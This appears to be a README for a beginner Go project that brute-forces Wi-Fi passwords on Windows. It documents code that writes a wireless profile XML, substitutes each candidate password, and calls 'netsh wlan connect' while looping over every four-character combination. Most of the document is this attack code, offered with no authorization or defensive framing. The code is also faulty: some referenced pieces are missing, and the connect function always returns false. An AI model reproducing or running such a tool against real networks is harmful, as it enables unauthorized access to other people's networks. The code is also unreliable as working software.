
# Golang Netsh

## Motivation

This project was inspired by the netsh package as well as to learn Golang.

## Networking

The networking works by creating a profile xml file and attepting to connect
with the correct password.

### Initalize

This function is it Initalize the project for other operations by creating the
xml file based off of the provided file inside the project. The function copies
the file content and writes it to a new file.

```go
func initalize(name string) error {
	data, err := ioutil.ReadFile("template.xml")
	must(err)
	str := string(data)
	str = strings.Replace(str, "{SSID}", name, 2)

	f, err := os.Create("profile.xml")
	must(err)
	f.Write([]byte(str))
	f.Close()
	return nil
}
```

### Close

The close function simply cleans the workspace by deleting the initalized file

```go
func close() error {
	err := os.Remove("profile.xml")
	must(err)
	return err
}
```

### CreateFileProfile

The function createFileProfile works by creating a file profile filled with the
provided password.

```go
func createFileProfile(name, pass, prev string) {
	data, err := ioutil.ReadFile("profile.xml")
	must(err)
	str := string(data)
	str = strings.Replace(str, prev, pass, 1)
	os.WriteFile("profile.xml", []byte(str), 0644)
}
```

### Connect to network

The connectToNetwork function works to make a connection attept to the provided
network.

```go
func connectToNetwork(name string) bool {
	str := fmt.Sprintf("name=%s", name)
	out, err := exec.Command("netsh", "wlan", "connect", str).Output()
	must(err)
	fmt.Print(string(out))
	return false
}
```

### TryPws

Function that will try all possible passwords to a specified network and return
the found password.

```go
func tryPws(name string) (string, bool) {
	initalize(name)
	previous := "{password}"
	for i := 0; i < len(arr); i++ {
		for j := 0; j < len(arr); j++ {
			for ii := 0; ii < len(arr); ii++ {
				for jj := 0; jj < len(arr); jj++ {
					pw := arr[i] + arr[j] + arr[ii] + arr[jj]
					if tryConnection(name, pw, previous) {
						close()
						return pw, true
					}
					previous = pw
				}
			}
		}
	}
	close()
	return "", false
}
```
